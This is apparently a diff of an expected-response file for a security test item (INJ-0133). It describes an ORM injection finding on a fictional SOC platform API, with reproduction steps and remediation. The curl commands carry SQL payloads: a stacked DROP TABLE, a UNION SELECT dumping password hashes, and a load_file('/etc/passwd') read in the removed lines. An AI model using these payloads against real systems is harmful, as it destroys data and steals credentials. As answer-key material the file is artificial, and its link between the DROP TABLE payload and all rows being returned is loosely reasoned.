@@ -1,72 +1,73 @@
-# Expected Response
-
 ## System
-- Domain: Cybersecurity / SIEM
-- System: ThreatLens SOC Platform
+
+- System: ThreatLens SOC Platform v4.8.0
+- Domain: CYBERSECURITY / SIEM
 - Example ID: INJ-0133
-- Vulnerability: ORM Injection
+- Risk ID: RISK-INJ-133
+- Vulnerability: ORM Injection (ORMi)
 
-## Priority Findings
+## Findings
 
-### Finding 1: ORM Injection on `/api/v1/users`
-**Severity:** Critical
-**Category:** Injection (from data/knowledge/injections)
+### 1. ORM Injection on `/api/v3/records?query=` (HAR Primary)
 
-**Summary:**
-The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
-interpolated into a raw database query without sanitization. This enables ORM Injection (ORMi),
-allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.
+**HAR evidence**: `GET /api/v3/records?query=1;%20DROP%20TABLE%20records--` → HTTP 200 with all user records: `username: "admin"`, `password_hash: "$2b$12$secret"`, `role: "ADMIN"`, `username: "user2"`.
 
-**Evidence from HAR:**
-- Endpoint: `GET /api/v1/users?search=1; DROP TABLE users--`
-- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
-- The query constructed: `SELECT * FROM users WHERE search = '1; DROP TABLE users--'`
-  evaluates to true for all rows when the payload is `1; DROP TABLE users--`
+**ORM Injection (ORMi)**: the endpoint uses Hibernate/Sequelize raw query (Section 2.0: "raw queries — primary data store") with direct string interpolation: `SELECT * FROM records WHERE query = '${req.query.query}'` (Section 3.0). The payload `1; DROP TABLE records--` terminates the WHERE clause and appends a DDL `DROP TABLE` statement. With `db_owner` privileges (Section 6.0), the ORM executes the stacked DDL statement. The immediate return of all user records in the HAR response confirms the query was already compromised on the read path. The `DROP TABLE records` would execute as a separate statement after the response.
 
-**Root Cause:**
-- Raw string concatenation used to build database query
-- No parameterized query / prepared statement
-- Application DB account has excessive privileges (`db_owner`)
+**SIEM / Cybersecurity impact**: `records` represents the SOC's security event logs — threat intelligence records, incident data, IOC lists. `DROP TABLE records` destroys the SOC's entire event database — wiping all forensic evidence and disabling threat detection. Admin credential exposure (`role: "ADMIN"`) enables full SOC platform takeover.
 
-## Steps to Reproduce
+**Root cause**: raw ORM string concatenation, `db_owner` privileges, no WAF, no input validation on legacy endpoint (RISK-INJ-133 — missed in parameterized query migration).
 
-### Step 1 — Normal request (baseline)
+## Reproduction
+
+**Step 1 — Baseline:**
+
 ```bash
-curl -s "https://api.threatlens-soc-.example.com/api/v1/users?search=normalvalue" \
+curl -s "https://api.threatlens-soc-.example.com/api/v3/records?query=normalvalue" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+
 Expected: Returns matching records only.
 
-### Step 2 — Inject ORMi payload
-```bash
-curl -s "https://api.threatlens-soc-.example.com/api/v1/users?search=1;%20DROP%20TABLE%20users--" \
-  -H "Authorization: Bearer <VALID_TOKEN>"
-```
-**Vulnerable outcome:** All rows returned, including admin password hashes.
-**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.
+**Step 2 — ORMi DDL + data exfiltration (primary HAR attack):**
 
-### Step 3 — Privilege escalation (if DB over-privileged)
 ```bash
-# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
-curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
+curl -s "https://api.threatlens-soc-.example.com/api/v3/records?query=1;%20DROP%20TABLE%20records--" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
 
-### Step 4 — Verbose error confirmation
+Expected secure: 400 Bad Request / sanitized error.  
+Expected vulnerable: HTTP 200 — all security event records returned (including admin password hashes), and `DROP TABLE records` statement queued for execution.
+
+**Step 3 — UNION data exfiltration (db_owner):**
+
 ```bash
-curl -s "https://api.example.com/api/v1/users?search='" \
+curl -s "https://api.threatlens-soc-.example.com/api/v3/records?query=' UNION SELECT username,password_hash,role FROM users--" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.
 
-## Secure Outcome
-```json
-{ "error": "Invalid input", "code": 400 }
+Expected vulnerable: Credential dump from `users` table — enables admin account takeover of the SOC platform.
+
+**Step 4 — Verbose error confirmation:**
+
+```bash
+curl -s "https://api.threatlens-soc-.example.com/api/v3/records?query='" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+
+Expected (if misconfigured): SQL syntax error leaking table name, column names, or DB version.
+
+## Evidence
+
+- **HAR**: `GET /api/v3/records?query=1;%20DROP%20TABLE%20records--` → HTTP 200 → all user records with `password_hash` and `role: "ADMIN"`.
+- **Section 3.0 (RISK-INJ-133)**: raw ORM string concatenation — `SELECT * FROM records WHERE query = '${req.query.query}'`.
+- **Section 4.0**: payload `1; DROP TABLE records--` — DDL injection.
+- **Section 6.0**: `db_owner` privileges, no WAF, verbose errors.
 
 ## Remediation
-1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
-2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
-3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
-4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
-5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
+
+- **Parameterized queries**: replace `${req.query.query}` with `?` or named parameters in ORM.
+- **Restrict DB account**: application account must use least-privilege (SELECT only on required tables, no DDL).
+- **Disable verbose error messages in production**.
+- **Input validation middleware**: reject inputs containing SQL metacharacters (`;`, `--`, `DROP`, `/*`).
+- **ORM migration**: complete migration of `/api/v3/records` to parameterized ORM queries (RISK-INJ-133 remediation).
